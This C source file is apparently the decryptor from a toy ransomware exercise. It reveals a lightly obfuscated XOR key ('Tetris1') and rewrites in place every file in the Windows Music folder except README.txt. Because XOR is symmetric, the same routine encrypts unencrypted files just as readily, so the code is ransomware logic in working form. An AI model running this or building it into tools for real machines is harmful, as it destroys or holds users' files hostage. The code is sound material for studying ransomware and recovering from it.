#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <shlobj.h>       // SHGetKnownFolderPath
#include <knownfolders.h> // FOLDERID_Music

// "Tetris1" -> each character +1 for obfuscation
char hidden_key[] = { 'U', 'f', 'u', 's', 'j', 't', '2', '\0' };

// Deobfuscates the key stored in memory
void reveal_key(char *key) {
    for (int i = 0; key[i] != '\0'; i++) {
        key[i] -= 1;
    }
}

// Applies XOR-based OTP cipher (encrypts or decrypts)
void apply_otp_cipher(char *data, size_t length, const char *key) {
    size_t key_len = strlen(key);
    for (size_t i = 0; i < length; i++) {
        data[i] ^= key[i % key_len];
    }
}

// Reads file content, decrypts it, and writes back
void process_file(const char *filepath, const char *key) {
    FILE *file = fopen(filepath, "rb+");
    if (!file) {
        perror("Failed to open file");
        return;
    }

    fseek(file, 0, SEEK_END);
    long size = ftell(file);
    rewind(file);

    if (size <= 0) {
        fclose(file);
        return;
    }

    char *buffer = (char *)malloc(size);
    if (!buffer) {
        perror("Memory allocation failed");
        fclose(file);
        return;
    }

    fread(buffer, 1, size, file);
    rewind(file);

    apply_otp_cipher(buffer, size, key);

    fwrite(buffer, 1, size, file);
    fclose(file);
    free(buffer);

    printf("Decrypted: %s\n", filepath);
}

// Gets the absolute path to the user's Music folder
int get_music_folder_path(char *outputPath, size_t maxLen) {
    PWSTR wide_path = NULL;
    if (SHGetKnownFolderPath(&FOLDERID_Music, 0, NULL, &wide_path) != S_OK) {
        return 0;
    }
    wcstombs(outputPath, wide_path, maxLen);
    CoTaskMemFree(wide_path);
    return 1;
}

int main() {
    char music_dir[MAX_PATH] = {0};
    if (!get_music_folder_path(music_dir, MAX_PATH)) {
        printf("Could not retrieve the Music folder path.\n");
        return 1;
    }

    // Reveal the real decryption key
    reveal_key(hidden_key);

    WIN32_FIND_DATAA fileData;
    HANDLE searchHandle;
    char pattern[MAX_PATH];
    char targetFile[MAX_PATH];

    snprintf(pattern, MAX_PATH, "%s\\*.*", music_dir);
    searchHandle = FindFirstFileA(pattern, &fileData);

    if (searchHandle == INVALID_HANDLE_VALUE) {
        printf("No files found in Music folder.\n");
        return 1;
    }

    do {
        if (!(fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            if (strcmp(fileData.cFileName, "README.txt") != 0) {
                snprintf(targetFile, MAX_PATH, "%s\\%s", music_dir, fileData.cFileName);
                process_file(targetFile, hidden_key);
            }
        }
    } while (FindNextFileA(searchHandle, &fileData));

    FindClose(searchHandle);
    printf("Decryption completed for Music folder.\n");
    return 0;
}
